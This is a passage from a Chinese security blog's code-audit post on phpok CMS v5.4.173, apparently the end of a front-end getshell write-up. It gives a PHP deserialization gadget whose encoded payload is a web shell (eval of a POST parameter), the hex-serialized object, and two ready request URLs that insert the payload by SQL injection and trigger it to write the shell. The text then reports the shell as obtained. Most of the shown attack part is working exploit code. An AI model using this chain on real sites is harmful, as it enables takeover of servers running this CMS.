+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cache</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $key_id=<span class="string">'moyu'</span>;</span><br><span class="line">    <span class="keyword">protected</span> $key_list=<span class="string">'aaaaaIDw/cGhwIGV2YWwoJF9QT1NUW21veXVdKTs/Pg=='</span>;</span><br><span class="line">    <span class="comment">//<span class="meta">&lt;?php</span> eval($_POST[moyu]);<span class="meta">?&gt;</span></span></span><br><span class="line">    <span class="keyword">protected</span> $folder=<span class="string">'php://filter/write=string.strip_tags|convert.base64-decode/resource='</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> bin2hex(serialize(<span class="keyword">new</span> cache()));</span><br><span class="line"><span class="comment">//4f3a353a226361636865223a333a7b733a393a22002a006b65795f6964223b733a343a226d6f7975223b733a31313a22002a006b65795f6c697374223b733a34353a2261616161614944772f63476877494756325957776f4a46395154314e5557323176655856644b54732f50673d3d223b733a393a22002a00666f6c646572223b733a36383a227068703a2f2f66696c7465722f77726974653d737472696e672e73747269705f746167737c636f6e766572742e6261736536342d6465636f64652f7265736f757263653d223b7d</span></span><br></pre></td></tr></table></figure>
+
+<p>可以通过任意sql语句执行来查询表结构，然后将反序列化数据带入到extra中，漏洞利用过程如下</p>
+<p>先插入数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">api.php?c=call&amp;f=index&amp;data=&#123;&quot;m_picplayer&quot;:&#123;&quot;type_id&quot;:&quot;sql&quot;,&quot;sqlinfo&quot;:&quot;INSERT INTO `phpok5`.`qinggan_fields`(`id`, `ftype`, `title`, `identifier`, `field_type`, `note`, `form_type`, `form_style`, `format`, `content`, `ext`, `search_separator`, `form_class`) VALUES (999, 0x74, 0x74, 0x74,0x74, 0x74, 0x74, 0x74, 0x74, 0x74,0x4f3a353a226361636865223a333a7b733a393a22002a006b65795f6964223b733a343a226d6f7975223b733a31313a22002a006b65795f6c697374223b733a34353a2261616161614944772f63476877494756325957776f4a46395154314e5557323176655856644b54732f50673d3d223b733a393a22002a00666f6c646572223b733a36383a227068703a2f2f66696c7465722f77726974653d737472696e672e73747269705f746167737c636f6e766572742e6261736536342d6465636f64652f7265736f757263653d223b7d,0x74, 0x74)&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后再触发反序列化来写入shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">api.php?c=call&amp;f=index&amp;data=&#123;&quot;m_picplayer&quot;:&#123;&quot;site&quot;:1,&quot;type_id&quot;:&quot;fields&quot;,&quot;pid&quot;:999&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到已经成功getshell</p>
+<p><img src="image-20200205211801189.png" alt="image-20200205211801189"></p>
+<p>这个cms的审计还是很有意思的，了解路由机制对代码审计的帮助非常大</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/02/04/gilacms-1-11-8/" rel="next" title="gilacms 1.11.8 代码审计">
+                <i class="fa fa-chevron-left"></i> gilacms 1.11.8 代码审计
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/02/06/thinkphp-5-0-22-rce/" rel="prev" title="thinkphp 5.0.22 RCE分析">
+                thinkphp 5.0.22 RCE分析 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/wlp.jpg" alt="Moyu">
+            
+              <p class="site-author-name" itemprop="name">Moyu</p>
+              <p class="site-description motion-element" itemprop="description">hack for fun</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">31</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#phpok-cms-v5-4-173-前台sql注入"><span class="nav-number">1.</span> <span class="nav-text">phpok cms v5.4.173 前台sql注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phpok-cms-v5-4-173-前台getshell"><span class="nav-number">2.</span> <span class="nav-text">phpok cms v5.4.173 前台getshell</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Moyu</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
